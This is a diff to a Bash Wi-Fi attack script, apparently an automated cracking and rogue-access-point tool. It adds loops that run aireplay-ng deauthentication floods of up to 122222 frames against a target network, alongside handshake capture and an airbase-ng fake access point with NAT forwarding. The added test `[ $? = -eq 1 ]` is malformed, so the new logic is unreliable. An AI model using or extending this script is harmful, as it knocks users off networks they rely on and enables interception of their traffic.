@@ -303,6 +303,15 @@ read -p 'security : ' apsec
  echo
  echo
  xterm -title crack -e airodump-ng -c $apch --bssid $apbssid -w gscap $winterface | xterm -title deauth -e aireplay-ng -0 16 -a $apbssid $winterface | echo -e  '\e[1;35m  close window if there is hanshake '
+ xterm -title deauth -e aireplay-ng -0 16 -a $apbssid $winterface
+
+      if [ $? = -eq 1 ]
+      then
+          while [ $? -ne "1" ]
+          do
+          xterm -title "Deauthentication-Attack" -e aireplay-ng -0 122222 -a $bssidda $interfaceda
+          done
+      fi
  echo
  echo
  echo
@@ -734,6 +743,15 @@ xterm -title cpa -e "airbase-ng $interfacecpa -e $apcpa -c 6" &
 sleep 2
 ifconfig at0 up 192.168.3.1 netmask 255.255.255.0
 xterm -e dhcpd -d -f -cf dhcpd12.conf | xterm -e aireplay-ng $interfacecpa -0 9989 -a $bssidcpa &
+
+      if [ $? = -eq 1 ]
+      then
+          while [ $? -ne "1" ]
+          do
+          xterm -title "Deauthentication-Attack" -e aireplay-ng -0 122222 -a $bssidcpa $interfacecpa
+          done
+      fi
+
 sysctl net.ipv4.ip_forward=1
 iptables --flush
   iptables --table nat --flush
